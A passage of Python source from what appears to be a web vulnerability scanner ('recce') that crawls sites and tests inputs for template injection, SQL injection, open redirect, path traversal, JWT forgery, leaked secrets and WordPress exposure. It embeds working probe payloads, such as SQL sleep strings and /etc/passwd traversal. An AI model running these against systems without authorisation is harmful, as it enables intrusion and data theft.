                               ["CWE-347"], proof[1],
                               "Stop issuing alg:none tokens; pin the algorithm.",
                               confidence="potential"))
                continue
            note = (f"A JWT with header alg=none was observed ({red}). If the server verifies "
                    "it, tokens can be forged with any claims.")
            if proof:
                note += "  " + proof[1]
            out.append(_mk(ip, port, "web-jwt", "high",
                           "JWT accepts 'alg:none' (unsigned - forgeable)", ["CWE-347"],
                           note, "Reject 'none'; pin the expected algorithm server-side.",
                           confidence="potential"))
            continue
        if alg in seen_alg:      # de-dupe the algorithmic notes (one per alg family)
            continue
        seen_alg.add(alg)
        if alg.startswith("hs"):
            out.append(_mk(ip, port, "web-jwt", "low",
                           f"JWT uses symmetric {alg.upper()} (offline-crackable secret)", ["CWE-347"],
                           f"JWT header alg={alg.upper()} ({red}). If the HMAC secret is weak it "
                           "cracks offline, letting you forge tokens.",
                           "Use a long random secret (or RS256); rotate it.",
                           confidence="potential"))
        elif alg.startswith(("rs", "es", "ps")):
            out.append(_mk(ip, port, "web-jwt", "info",
                           f"JWT uses {alg.upper()} (check RS256->HS256 key-confusion)", ["CWE-347"],
                           f"JWT header alg={alg.upper()} ({red}). Test the algorithm-confusion "
                           "attack (sign with the public key as an HS256 secret).",
                           "Pin the algorithm; don't accept alg switching.",
                           confidence="potential"))
    return out


# --- SSTI / reflected-input quick check -----------------------------------------
def _scan_reflection(ip: str, port: Port, base: str, auth) -> list[Vuln]:
    # One request. {{7*7}} / ${7*7} / <%=7*7%> evaluating to 49 near our canary is a
    # strong, low-false-positive SSTI signal; an unencoded <i> reflection is an
    # XSS lead to verify. Injected into a throwaway param - non-destructive.
    payload = "recceA{{7*7}}recceB${7*7}recceC<%=7*7%>recceD<i>"
    r = _fetch(ip, port, "/?rc=" + quote(payload), auth=auth)
    if not r or r[0] >= 500 or not r[2]:
        return []
    b = r[2]
    out: list[Vuln] = []
    if "recceA49" in b or "recceB49" in b or "recceC49" in b:
        out.append(_mk(ip, port, "web-ssti", "high",
                       "Server-Side Template Injection (7*7 evaluated to 49)", ["CWE-1336", "CWE-94"],
                       f"GET {base}/?rc=<7*7 payload> returned the evaluated '49' next to the canary "
                       "-> the template engine executed our input.",
                       "Never render user input as a template; sandbox/escape it."))
    elif "recceD<i>" in b:
        out.append(_mk(ip, port, "web-reflected", "medium",
                       "Input reflected unencoded (reflected-XSS lead)", ["CWE-79"],
                       f"GET {base}/?rc=…<i> reflected the '<i>' unencoded -> verify for reflected XSS.",
                       "Context-encode all reflected user input.", confidence="potential"))
    return out


# --- client-side JS secret scraping ---------------------------------------------
_JS_SECRETS = [
    (re.compile(r"AIza[0-9A-Za-z_\-]{35}"), "Google API key"),
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS access key id"),
    (re.compile(r"sk_live_[0-9A-Za-z]{16,}"), "Stripe live secret key"),
    (re.compile(r"gh[pousr]_[0-9A-Za-z]{36}"), "GitHub token"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z-]{10,}"), "Slack token"),
    (re.compile(r"-----BEGIN [A-Z ]*PRIVATE KEY-----"), "private key"),
    (re.compile(r'apiKey["\']\s*:\s*["\'][^"\']{8,}'), "hardcoded apiKey"),
]
_SCRIPT_SRC = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)


def _scan_js(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    seen_secret: set[str] = set()
    srcs = [s for s in _SCRIPT_SRC.findall(body)
            if "://" not in s and not s.startswith("//")][:8]
    for src in srcs:
        path = src if src.startswith("/") else "/" + src
        r = _fetch(ip, port, path, auth=auth, read=131072)
        if not r or r[0] != 200:
            continue
        js = r[2]
        for rx, label in _JS_SECRETS:
            m = rx.search(js)
            if m and label not in seen_secret:
                seen_secret.add(label)
                out.append(_mk(ip, port, "web-js-secret", "high",
                               f"Secret in client-side JS: {label}", ["CWE-615", "CWE-200"],
                               f"{base}{path} contains a {label} (starts '{m.group(0)[:12]}…').",
                               "Move secrets server-side; rotate any exposed key."))
    return out


# --- WordPress plugin / version enum (wpscan-lite) ------------------------------
_WP_PLUGINS = ["contact-form-7", "woocommerce", "elementor", "wordpress-seo", "wordfence",
               "akismet", "jetpack", "wpforms-lite", "revslider", "wp-file-manager",
               "duplicator", "all-in-one-wp-migration"]


def _scan_wordpress(ip: str, port: Port, base: str, body: str, auth) -> list[Vuln]:
    out: list[Vuln] = []
    # Core version from the generator meta or /readme.html.
    ver = ""
    m = re.search(r"WordPress\s+([\d.]+)", body)
    if not m:
        rd = _fetch(ip, port, "/readme.html", auth=auth)
        if rd and rd[0] == 200:
            m = re.search(r"[Vv]ersion\s+([\d.]+)", rd[2])
    if m:
        ver = m.group(1)
        out.append(_mk(ip, port, "web-wp-version", "info",
                       f"WordPress {ver} detected", ["CWE-1104"],
                       f"WordPress core version {ver} (check for known core CVEs; run wpscan).",
                       "Keep WordPress core current."))
    # XML-RPC (brute-force / amplification surface).
    x = _fetch(ip, port, "/xmlrpc.php", method="POST", body="<methodCall></methodCall>", auth=auth)
    if x and x[0] in (200, 405) and "xml" in x[1].get("content-type", "").lower():
        out.append(_mk(ip, port, "web-wp-xmlrpc", "low",
                       "WordPress XML-RPC enabled", ["CWE-799"],
                       f"{base}/xmlrpc.php is enabled (password brute-force + pingback amplification).",
                       "Disable xmlrpc.php if unused."))
    # Installed plugins + their version (readme Stable tag).
    for slug in _WP_PLUGINS:
        r = _fetch(ip, port, f"/wp-content/plugins/{slug}/readme.txt", auth=auth)
        if r and r[0] == 200 and "=== " in r[2]:
            pv = re.search(r"Stable tag:\s*([\d.]+)", r[2])
            pver = pv.group(1) if pv else "?"
            out.append(_mk(ip, port, "web-wp-plugin", "info",
                           f"WordPress plugin '{slug}' v{pver} present", ["CWE-1104"],
                           f"{base}/wp-content/plugins/{slug}/ (readme Stable tag {pver}); "
                           "check it against wpscan/searchsploit.",
                           "Keep plugins current; remove unused ones."))
    return out


# --- authenticated crawler ------------------------------------------------------
# attribute values may be quoted or bare, so accept both.
_HREF_RE = re.compile(r'(?:href|action|src)\s*=\s*["\']?([^"\'>\s]+)', re.I)
_FORM_RE = re.compile(r"<form\b[^>]*>.*?</form>", re.I | re.S)
_ACTION_RE = re.compile(r'action\s*=\s*["\']?([^"\'>\s]+)', re.I)
_METHOD_RE = re.compile(r'method\s*=\s*["\']?([^"\'>\s]+)', re.I)
_INPUT_RE = re.compile(r"<input\b[^>]*>", re.I)
_NAME_RE = re.compile(r'name\s*=\s*["\']?([^"\'>\s]+)', re.I)
_ITYPE_RE = re.compile(r'type\s*=\s*["\']?([^"\'>\s]+)', re.I)


def _same_origin_path(href: str, ip: str, cur_url: str) -> str | None:
    href = (href or "").split("#")[0].strip()
    if not href or href.lower().startswith(("mailto:", "javascript:", "tel:", "data:")):
        return None
    pr = urlparse(urljoin(cur_url, href))
    if pr.scheme not in ("http", "https"):
        return None
    if pr.hostname and pr.hostname != ip:       # same host (IP) only
        return None
    path = pr.path or "/"
    return f"{path}?{pr.query}" if pr.query else path


def _parse_form(html: str, page_path: str) -> dict:
    am = _ACTION_RE.search(html)
    mm = _METHOD_RE.search(html)
    inputs, fields, has_pw, has_token = [], [], False, False
    for inp in _INPUT_RE.findall(html) + re.findall(r"<(?:textarea|select)\b[^>]*>", html, re.I):
        nm = _NAME_RE.search(inp)
        tm = _ITYPE_RE.search(inp)
        name = nm.group(1) if nm else ""
        itype = (tm.group(1).lower() if tm else "text")
        if itype == "password":
            has_pw = True
        if name and re.search(r"csrf|token|authenticity|nonce", name, re.I):
            has_token = True
        if name:
            inputs.append(name)
            fields.append((name, itype))
    return {"action": am.group(1) if am else page_path,
            "method": (mm.group(1).lower() if mm else "get"),
            "inputs": inputs, "fields": fields, "password": has_pw, "csrf": has_token}


# Field types / names we never fuzz (submit buttons, secrets, anti-CSRF tokens).
_SKIP_TYPES = {"password", "submit", "button", "image", "file", "reset", "hidden"}
_SKIP_NAME = re.compile(r"csrf|token|authenticity|nonce|captcha|__viewstate", re.I)


def _fuzzable_fields(form: dict) -> list[str]:
    """Form field names worth injecting into: skip passwords, submit buttons, file
    uploads, and anti-CSRF/hidden token fields. Bounded to keep the request budget sane."""
    out = []
    for name, itype in form.get("fields") or [(n, "text") for n in form.get("inputs", [])]:
        if itype in _SKIP_TYPES or _SKIP_NAME.search(name):
            continue
        if name not in out:
            out.append(name)
    return out[:6]


def crawl(ip: str, port: Port, auth: dict | None = None,
          max_pages: int = 40, max_depth: int = 2) -> dict:
    """Same-origin BFS crawl (as the authenticated user if `auth` is set). Returns
    {'pages': [...], 'forms': [...], 'params': [(path, name), ...]}."""
    from collections import deque
    base = url_for(ip, port)
    seen = {"/"}
    q = deque([("/", 0)])
    pages: list[dict] = []
    forms: list[dict] = []
    params: list[tuple] = []
    pseen: set = set()
    while q and len(pages) < max_pages:
        path, depth = q.popleft()
        r = _fetch(ip, port, path, auth=auth)
        if not r:
            continue
        status, headers, body = r
        pages.append({"path": path, "status": status})
        if "?" in path:
            bp, qs = path.split("?", 1)
            for kv in qs.split("&"):
                if "=" in kv:
                    key = (bp, kv.split("=", 1)[0])
                    if key not in pseen:
                        pseen.add(key)
                        params.append(key)
        if "html" not in headers.get("content-type", "").lower() and body.lstrip()[:1] != "<":
            continue
        cur_url = base + path
        for href in _HREF_RE.findall(body):
            npath = _same_origin_path(href, ip, cur_url)
            if npath and npath not in seen:
                seen.add(npath)
                if depth < max_depth:
                    q.append((npath, depth + 1))
        for fm in _FORM_RE.findall(body):
            forms.append(_parse_form(fm, path))
    return {"pages": pages, "forms": forms, "params": params[:15]}


# --- injection transport (shared by reflection/SSTI + SQLi) ---------------------

def _timed_fetch(ip, port, path, method="GET", body=None, auth=None):
    t0 = time.monotonic()
    r = _fetch(ip, port, path, method=method, body=body, auth=auth)
    return r, time.monotonic() - t0


def _form_request(form: dict, param: str, payload: str):
    """(method, path, body, ctype) that sets `param`=payload and holds the form's other
    fields at a benign baseline value ('1')."""
    fields = {n: "1" for n in form.get("inputs", [])}
    fields[param] = payload
    enc = urlencode(fields)
    if (form.get("method") or "get").lower() == "post":
        return "POST", form["action"], enc, "application/x-www-form-urlencoded"
    sep = "&" if "?" in form["action"] else "?"
    return "GET", f"{form['action']}{sep}{enc}", None, None


def _make_sender(ip: str, port: Port, kind: str, obj, param: str, auth):
    """Return send(payload) -> (response_or_None, elapsed_seconds). `kind` is 'get'
    (obj = path, inject a query param) or 'form' (obj = parsed form, inject a field)."""
    def send(payload: str):
        if kind == "get":
            sep = "&" if "?" in obj else "?"
            return _timed_fetch(ip, port, f"{obj}{sep}{param}=" + quote(payload), auth=auth)
        method, path, body, ctype = _form_request(obj, param, payload)
        extra = dict(auth or {})
        if ctype:
            extra["Content-Type"] = ctype
        return _timed_fetch(ip, port, path, method=method, body=body, auth=extra or None)
    return send


def _body(sr):
    r = sr[0] if sr else None
    return r[2] if r and len(r) > 2 else None


# --- reflection / SSTI (canary) -------------------------------------------------

def _reflect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
    b = _body(send("recceA{{7*7}}recceD<i>"))
    if not b:
        return []
    if "recceA49" in b:
        return [_mk(ip, port, "web-ssti", "high",
                    "Server-Side Template Injection (7*7 evaluated to 49)", ["CWE-1336", "CWE-94"],
                    f"{where} evaluated our template payload to 49.",
                    "Never render user input as a template; sandbox/escape it.")]
    if "recceD<i>" in b:
        return [_mk(ip, port, "web-reflected", "medium",
                    f"Input reflected unencoded in {where} (reflected-XSS lead)", ["CWE-79"],
                    f"{where} reflected '<i>' unencoded - verify for XSS.",
                    "Context-encode reflected user input.", confidence="potential")]
    return []


def _reflect_param(ip: str, port: Port, page_path: str, param: str, auth) -> list[Vuln]:
    return _reflect_via(ip, port, f"param '{param}' on {page_path}",
                        _make_sender(ip, port, "get", page_path, param, auth))


# --- SQL injection (error / boolean / opt-in time), non-destructive payloads -----
# All payloads live inside a SELECT/WHERE context (quote-break + AND/OR sleep) - no
# stacked DROP/UPDATE/DELETE, so a probe only reads, never modifies.
_SQL_ERRORS = [
    (re.compile(r"SQL syntax.*?MySQL|check the manual that corresponds to your (MySQL|MariaDB)|"
                r"MySqlException|valid MySQL result|com\.mysql\.jdbc|mysqli?_", re.I), "MySQL"),
    (re.compile(r"PostgreSQL.*?ERROR|pg_query\(\)|PSQLException|syntax error at or near|"
                r"unterminated quoted string|org\.postgresql", re.I), "PostgreSQL"),
    (re.compile(r"Microsoft SQL Server|ODBC SQL Server Driver|SQLServerException|"
                r"Unclosed quotation mark after|Incorrect syntax near|System\.Data\.SqlClient",
                re.I), "MSSQL"),
    (re.compile(r"ORA-[0-9]{5}|Oracle error|quoted string not properly terminated|"
                r"PLS-[0-9]{5}|oracle\.jdbc", re.I), "Oracle"),
    (re.compile(r"SQLite/JDBCDriver|SQLiteException|sqlite3\.OperationalError|"
                r"unrecognized token|near \".{0,20}\": syntax error", re.I), "SQLite"),
    (re.compile(r"SQLSTATE\[|DB2 SQL error|Sybase message|Npgsql\.|"
                r"java\.sql\.SQLException", re.I), "SQL"),
]
# '§' is replaced with the sleep duration at probe time.
_SLEEP_PAYLOADS = [
    "1' AND SLEEP(§)-- -",                              # MySQL (string context)
    "1 AND SLEEP(§)",                                   # MySQL (numeric context)
    "1' AND 1=(SELECT 1 FROM PG_SLEEP(§))-- -",         # PostgreSQL
    "1';WAITFOR DELAY '0:0:§'-- -",                     # MSSQL (delay only)
]


def _sql_error(body: str):
    for rx, lbl in _SQL_ERRORS:
        if rx.search(body or ""):
            return lbl
    return None


def _similar(a, b) -> float:
    if a is None or b is None:
        return 0.0
    return difflib.SequenceMatcher(None, a[:3000], b[:3000]).ratio()


def _sqli_via(ip: str, port: Port, where: str, send, time_based: bool = False) -> list[Vuln]:
    """Error-based + boolean-based (default) and, opt-in, time-based SQLi on one input.
    Returns at most one finding (the strongest technique that fires)."""
    def mk(tech, detail):
        return [_mk(ip, port, "web-sqli", "high",
                    f"SQL injection in {where} ({tech})", ["CWE-89"], detail,
                    "Use parameterised queries / prepared statements; never build SQL by "
                    "string concatenation. Validate + canonicalise input.")]

    # 1) Error-based: a DBMS error that appears only after we break out of the quote.
    base = _body(send("1"))
    if base is not None and not _sql_error(base):
        for q in ("'", "\"", "')", "\\"):
            rb = _body(send("1" + q))
            lbl = _sql_error(rb) if rb is not None else None
            if lbl:
                return mk(f"error-based, {lbl}",
                          f"Injecting {q!r} into {where} triggered a {lbl} database error - "
                          "the app passed our input straight into a SQL query.")

    # 2) Boolean-based blind: TRUE ~ baseline, FALSE diverges, and it reproduces.
    b1, b2 = _body(send("1")), _body(send("1"))
    if b1 and b2 and _similar(b1, b2) >= 0.95:          # skip highly dynamic pages
        for tp, fp in (("1 AND 1=1", "1 AND 1=2"), ("1' AND '1'='1", "1' AND '1'='2")):
            bt, bf = _body(send(tp)), _body(send(fp))
            if not bt or not bf:
                continue
            if _similar(bt, b1) >= 0.95 and _similar(bf, b1) <= 0.9 and _similar(bt, bf) <= 0.9:
                bt2, bf2 = _body(send(tp)), _body(send(fp))   # confirm it reproduces
                if bt2 and bf2 and _similar(bt2, b1) >= 0.95 and _similar(bf2, b1) <= 0.9:
                    return mk("boolean-based blind",
                              f"A true condition ({tp!r}) returned the baseline page while a "
                              f"false one ({fp!r}) returned a different page - the app evaluates "
                              "our injected SQL boolean.")

    # 3) Time-based blind (opt-in): a DB sleep delays the response, scaling with the arg.
    if time_based:
        samples = [el for el in (send("1")[1], send("1")[1])]
        base_t = sorted(samples)[len(samples) // 2] if samples else 0.0
        for tmpl in _SLEEP_PAYLOADS:
            _, e5 = send(tmpl.replace("§", "5"))
            if e5 >= base_t + 4.0:
                _, e2 = send(tmpl.replace("§", "2"))        # must scale with the sleep arg
                if (e5 - e2) >= 1.5:
                    return mk("time-based blind",
                              "A sleep payload delayed the response ~5s (and ~2s for the 2s "
                              "variant), so our injected SQL controls execution time.")
    return []


# --- open redirect --------------------------------------------------------------
_REDIR_HOST = "recce-oob.example"                       # a host we'll never legitimately host
_REDIR_PAYLOADS = (f"https://{_REDIR_HOST}/x", f"//{_REDIR_HOST}/x", f"/\\{_REDIR_HOST}/x")


def _open_redirect_via(ip: str, port: Port, where: str, send) -> list[Vuln]:
    """A parameter reflected into the Location of a 3xx pointing at an attacker host.
    Reads the redirect only (http.client does not auto-follow) - non-destructive."""
    for payload in _REDIR_PAYLOADS:
        r = send(payload)[0]
        if not r or not (300 <= r[0] < 400):
            continue
        loc = (r[1].get("location") or "").strip()
        low = loc.lower()
        if low.startswith((f"https://{_REDIR_HOST}", f"http://{_REDIR_HOST}",
                           f"//{_REDIR_HOST}", f"/\\{_REDIR_HOST}")):
            return [_mk(ip, port, "web-openredirect", "medium",
                        f"Open redirect via {where}", ["CWE-601"],
                        f"{where} set to {payload!r} -> HTTP {r[0]} Location: {loc[:120]} "
                        "(redirects to an attacker-controlled host).",
                        "Allow-list redirect targets; never redirect to a raw user value.",
                        confidence="confirmed")]
    return []


# --- generic path traversal / local file read ----------------------------------
_TRAVERSAL_PAYLOADS = (
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//etc/passwd",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
    "../../../../../../../../windows/win.ini",
)
_TRAVERSAL_HIT = re.compile(r"root:.*?:0:0:|\[fonts\]|\[extensions\]", re.I)
# Only worth traversing params that plausibly name a file/path (keeps the budget + FP low).
_FILEISH_PARAM = re.compile(
    r"file|path|page|template|doc|download|include|dir|folder|load|read|view|attachment|img|src",
    re.I)


def _traversal_via(ip: str, port: Port, where: str, param: str, send) -> list[Vuln]:
    if not _FILEISH_PARAM.search(param):
        return []
    for payload in _TRAVERSAL_PAYLOADS:
        b = _body(send(payload))
        if b and _TRAVERSAL_HIT.search(b):
            what = "/etc/passwd" if "win.ini" not in payload else "windows/win.ini"
            return [_mk(ip, port, "web-lfi", "high",
                        f"Path traversal / local file read via {where}", ["CWE-22"],
                        f"{where} set to {payload!r} returned {what} content "
                        "(the app reads a file path from our input).",
                        "Canonicalise + allow-list file paths; never build a path from raw "
                        "user input.", confidence="confirmed")]
    return []


# A form is NOT auto-submitted when its action verb OR one of its fields signals a real
# side effect (state change / transaction / content post / file upload). Submitting such
# a form with junk values could delete data, place an order, send mail, invite users,
# etc. Login/search/filter/generic forms (where injection actually lives) stay fuzzable.
_SKIP_FORM_ACTION = re.compile(
    r"delete|remove|destroy|\bdrop\b|wipe|purge|reset|revoke|disable|deactivate|ban|"
    r"kick|logout|sign.?out|transfer|pay(ment)?|checkout|order|buy|purchase|invite|"
    r"subscribe|unsubscribe|register|sign.?up|upload|import|export|\bsend\b|e?mail|"
    r"message|comment|publish|deploy|exec(ute)?|restart|reboot|shutdown|approve", re.I)
_SENSITIVE_FIELD = re.compile(
    r"amount|price|\bqty\b|quantity|total|card|cvv|cvc|iban|swift|routing|account|"
    r"recipient|payee|e?mail|phone|mobile|\bssn\b|\bdob\b|message|subject|\bbody\b|"
    r"comment|content|\botp\b|\bpin\b|upload|attachment", re.I)


def _form_risk(form: dict, allow_risky: bool = False) -> str:
    """Reason this form should NOT be auto-submitted during fuzzing (side-effect risk),
    or '' if it is safe to fuzz. A file-upload form is never auto-submitted. With
    allow_risky the state-change/transaction guards are relaxed (uploads still skipped)."""
    for name, itype in form.get("fields") or []:
        if itype == "file":
            return f"has a file-upload field '{name}'"
    if allow_risky:
        return ""
    action = form.get("action", "")
    if _SKIP_FORM_ACTION.search(action):
        return f"action '{action[:60]}' looks state-changing"
    for name, _itype in form.get("fields") or []:
        if _SENSITIVE_FIELD.search(name):
            return f"has a sensitive/transactional field '{name}'"
    return ""


def _crawl_findings(ip: str, port: Port, cres: dict) -> list[Vuln]:
    out: list[Vuln] = []
    tls = probes._is_tls(port)
    for f in cres["forms"]:
        if f["password"] and not tls:
            out.append(_mk(ip, port, "web-cleartext-login", "high",
                           "Password form submitted over cleartext HTTP", ["CWE-319"],
                           f"A login form (action {f['action']}) submits credentials over HTTP.",
                           "Serve authentication over HTTPS + HSTS."))
        if f["method"] == "post" and f["password"] and not f["csrf"]:
            out.append(_mk(ip, port, "web-csrf", "low",
                           "Login/POST form without an anti-CSRF token", ["CWE-352"],
                           f"Form action {f['action']} (POST, password) has no csrf/token hidden field.",
                           "Add a per-session anti-CSRF token.", confidence="potential"))
    return out


def _inject_param(ip, port, where, param, send, sqli, time_based):
    """Run every input-injection check against one parameter/field via its `send`
    closure: reflection/SSTI, SQLi (optional), open redirect, path traversal."""
    fs = _reflect_via(ip, port, where, send)
    if sqli:
        fs += _sqli_via(ip, port, where, send, time_based)
    fs += _open_redirect_via(ip, port, where, send)
    fs += _traversal_via(ip, port, where, param, send)
    return fs


def scan_crawl(host: Host, auth: dict | None = None, sqli: bool = True,
               time_based: bool = False, fuzz_risky: bool = False) -> tuple[int, int]:
    """Crawl every web endpoint (authenticated if auth is set), test discovered GET
    params AND form fields for reflection/SSTI, SQL injection, open redirect and path
    traversal, and flag risky forms. `time_based` opts into the slower time-blind SQLi
    probe. Forms whose action/fields signal a real side effect (delete / pay / send /
    upload / ...) are NOT submitted - they're recorded so the operator tests them by
    hand; `fuzz_risky=True` relaxes that (file uploads are still never submitted).
    Returns (pages_crawled, findings_added)."""
    existing = {v.key for v in host.vulns}
    pages = added = 0
    for port in host.open_ports:
        if not is_web(port):
            continue
        cres = crawl(host.ip, port, auth=auth)
        pages += len(cres["pages"])
        fs = _crawl_findings(host.ip, port, cres)
        budget = 24                        # cap injectable targets per endpoint

        # Discovered GET query params (idempotent - always safe to fuzz).
        for pth, prm in cres["params"]:
            if budget <= 0:
                break
            send = _make_sender(host.ip, port, "get", pth, prm, auth)
            fs += _inject_param(host.ip, port, f"param '{prm}' on {pth}", prm,
                                send, sqli, time_based)
            budget -= 1

        # Form fields (POST/GET bodies). Skip forms that would cause a side effect,
        # and record them so nothing is silently untested.
        skipped: list[str] = []
        for form in (cres["forms"] or [])[:6]:
            risk = _form_risk(form, allow_risky=fuzz_risky)
            where_base = f"form {(form.get('method') or 'get').upper()} {form['action']}"
            if risk:
                skipped.append(f"{where_base} ({risk})")
                continue
            for prm in _fuzzable_fields(form):
                if budget <= 0:
                    break
                send = _make_sender(host.ip, port, "form", form, prm, auth)
                fs += _inject_param(host.ip, port, f"field '{prm}' of {where_base}", prm,
                                    send, sqli, time_based)
                budget -= 1
        if skipped:
            fs.append(_mk(host.ip, port, "web-form-unfuzzed", "info",
                          "Form(s) not auto-fuzzed (side-effect risk) - test by hand",
                          ["CWE-200"],
                          "recce did NOT submit these forms to avoid side effects; review "
                          "them manually (or re-run --crawl --fuzz-risky-forms on a "
                          "throwaway target):\n  " + "\n  ".join(skipped[:12]),
                          "N/A - operator note.", confidence="potential"))

        for v in fs:
            if v.key in existing:
                continue
            existing.add(v.key)
            host.vulns.append(v)
            added += 1
    return pages, added


def scan_endpoint(ip: str, port: Port, active: bool = True,
                  auth: dict | None = None, creds: bool = False) -> tuple[dict, list[Vuln]]:
    """Deep, non-intrusive scan of one web endpoint. Returns (profile, [Vuln]).
    `auth` (Cookie/Authorization headers) runs the scan as an authenticated user;
    `creds` opts into a tiny, lockout-aware default-credential probe."""
    findings: list[Vuln] = []
    base = url_for(ip, port)
    # Root fetch: fingerprint + directory listing + cookie flags.
    root = _fetch(ip, port, "/", auth=auth)
    status = root[0] if root else None
    headers = root[1] if root else {}
    body = root[2] if root else ""
    fp = fingerprint(headers, body) if root else {"tech": [], "title": ""}
    # Enrich the port's product/version from the web fingerprint when nmap left it
    # blank, so it flows into the CVE mapping + Services-by-Product pivot.
    if root and not port.product:
        prod, ver = product_version(headers, body)
        if prod:
            port.product = prod
            port.version = port.version or ver
            port.detect_source = port.detect_source or "web"
    profile = {"ip": ip, "port": port.portid, "scheme": scheme_for(port),
               "url": base, "status": status,
               "server": headers.get("server", ""), "tech": fp["tech"],
               "title": fp["title"]}
    # Security headers + TLS (reuse the existing stdlib probes).
    findings.extend(probes.http_findings(ip, port))
    if probes._is_tls(port):
        findings.extend(probes.tls_findings(ip, port))
    # JWT weaknesses read from the root response. Passively we flag the algorithm;
    # actively we forge an alg:none token and replay it to prove acceptance.
    if root:
        findings.extend(_scan_jwts(ip, port, headers, body, active=active))
    # The active HTTP checks only make sense if the port actually spoke HTTP -
    # skip them for a TLS-only non-HTTP port (LDAPS/IMAPS) so we don't waste a
    # dozen dead requests there (its TLS findings above still count).
    if not active or root is None:
        profile["findings"] = len(findings)
        return profile, findings
    # Directory listing on the root.
    if root and status == 200 and re.search(r"<title>Index of /|Directory listing for", body, re.I):
        findings.append(_mk(ip, port, "web-dirlisting", "medium",
                            "Directory listing enabled", ["CWE-548"],
                            f"GET {profile['url']}/ returned an auto-index page.",
                            "Disable automatic directory indexing (Options -Indexes)."))
    # Cookie hardening (per Set-Cookie): HttpOnly / Secure / SameSite / prefix / scope.
    findings.extend(_cookie_findings(ip, port, headers.get("set-cookie", "")))
    # Dangerous HTTP methods. When PUT is advertised AND active, we don't just
    # trust the Allow header - we prove it: PUT a marker, GET it back, DELETE it.
    opt = _fetch(ip, port, "/", method="OPTIONS", auth=auth)
    if opt and opt[1].get("allow"):
        allowed = {m.strip().upper() for m in opt[1]["allow"].split(",")}
        bad = sorted(allowed & _DANGEROUS_METHODS)
        if bad:
            put_proof = _prove_put(ip, port, auth) if ("PUT" in bad and active) else None
            if put_proof and put_proof[0]:
                findings.append(_mk(ip, port, "web-methods", "high",
                    "Arbitrary file write via HTTP PUT (proven)", ["CWE-434", "CWE-650"],
                    put_proof[1], "Disable WebDAV/PUT write; restrict the allowed methods.",
                    confidence="confirmed"))
                others = [m for m in bad if m != "PUT"]
                if others:
                    findings.append(_mk(ip, port, "web-methods", "medium",
                        f"Dangerous HTTP methods advertised: {', '.join(others)}",
                        ["CWE-650"], f"OPTIONS / -> Allow: {opt[1]['allow']}",
                        "Disable unless required.", confidence="potential"))
            else:
                note = f"OPTIONS / -> Allow: {opt[1]['allow']}"
                conf = "confirmed" if active else "potential"
                if put_proof and not put_proof[0]:      # actively tested, PUT rejected
                    note += f"; {put_proof[1]}"
                    conf = "potential"
                sev = "high" if "PUT" in bad else "medium"
                findings.append(_mk(ip, port, "web-methods", sev,
                    f"Dangerous HTTP methods enabled: {', '.join(bad)}", ["CWE-650"],
                    note, "Disable PUT/DELETE/TRACE/CONNECT unless required.",
                    confidence=conf))
    # CORS: does the server reflect an arbitrary Origin AND allow credentials?
    probe_origin = "https://recce.example"
    cors = _fetch(ip, port, "/", auth={**(auth or {}), "Origin": probe_origin})
    if cors:
        ch = cors[1]
        acao = ch.get("access-control-allow-origin", "")
        acac = ch.get("access-control-allow-credentials", "").lower()
        if acao == probe_origin and acac == "true":
            findings.append(_mk(ip, port, "web-cors", "high",
                                "CORS reflects arbitrary Origin with credentials", ["CWE-942"],
                                f"Origin: {probe_origin} -> Access-Control-Allow-Origin: {acao}, "
                                "Allow-Credentials: true (any site can read authenticated responses).",
                                "Echo only an allow-list of trusted origins; never reflect + credentials."))
    # GraphQL introspection enabled?
    gql = '{"query":"query{__schema{queryType{name}}}"}'
    for gp in ("graphql", "api/graphql", "v1/graphql", "query"):
        r = _fetch(ip, port, "/" + gp, method="POST", body=gql, auth=auth)
        if r and r[0] == 200 and ("__schema" in r[2] or '"queryType"' in r[2]):
            findings.append(_mk(ip, port, "web-graphql", "medium",
                                "GraphQL introspection enabled", ["CWE-200"],
                                f"POST {profile['url']}/{gp} (__schema query) returned the schema.",
                                "Disable GraphQL introspection in production."))
            break
    # High-signal exposure paths.
    seen_sid: set[str] = set()
    for path, sev, sid, title, cwes, fix, confirm in _PATHS:
        r = _fetch(ip, port, "/" + path, auth=auth)
        if not r:
            continue
        st, _hd, bd = r
        try:
            if confirm(st, bd):
                if sid in seen_sid:
                    continue
                seen_sid.add(sid)
                detail = (f"GET {base}/{path} -> HTTP {st} "
                          f"(content matched the {title.split('(')[0].strip()} signature).")
                # For secret-bearing files, show WHAT leaked (redacted).
                if sid in ("web-dotenv", "web-aws", "web-htpasswd"):
                    sec = _leaked_secrets(bd)
                    if sec:
                        detail += "  leaked: " + "; ".join(sec)
                findings.append(_mk(ip, port, sid, sev, title, cwes, detail, fix))
        except Exception:  # noqa: BLE001 - a bad body never breaks the sweep
            continue
    # Deep dives (each self-gates so they cost nothing when absent).
    findings.extend(_scan_actuator(ip, port, base, auth))
    findings.extend(_scan_backups(ip, port, base, auth))
    findings.extend(_scan_reflection(ip, port, base, auth))
    findings.extend(_scan_js(ip, port, base, body, auth))
    if any("wordpress" in t.lower() for t in fp["tech"]):
        findings.extend(_scan_wordpress(ip, port, base, body, auth))
    if creds:
        findings.extend(_basic_auth_defaults(ip, port, base,
                                             ["/", "/manager/html", "/admin", "/console",
                                              "/api/whoami", "/api/overview"]))
        findings.extend(_form_login_defaults(ip, port, base, fp["tech"]))
    profile["findings"] = len(findings)
    return profile, findings


def scan_host(host: Host, active: bool = True, auth: dict | None = None,
              creds: bool = False) -> list[dict]:
    """Scan every web endpoint on a host, appending deduped Vulns. Returns the web
    endpoint profiles (for the Web sheet)."""
    existing = {v.key for v in host.vulns}
    profiles: list[dict] = []
    for port in host.open_ports:
        if not is_web(port):
            continue
        profile, findings = scan_endpoint(host.ip, port, active=active, auth=auth, creds=creds)
        for v in findings:
            if v.key in existing:
                continue
            existing.add(v.key)
            host.vulns.append(v)
        profiles.append(profile)
    return profiles


# --- categorization + Kali bridge ----------------------------------------------

def web_endpoints(hosts: list[Host]) -> list[dict]:
    """Every web endpoint across all hosts (from stored data - no network), for the
    Web sheet: url, server/tech (nmap), and how many web findings it carries."""
    out: list[dict] = []
    for h in hosts:
        for p in h.open_ports:
            if not is_web(p):
                continue
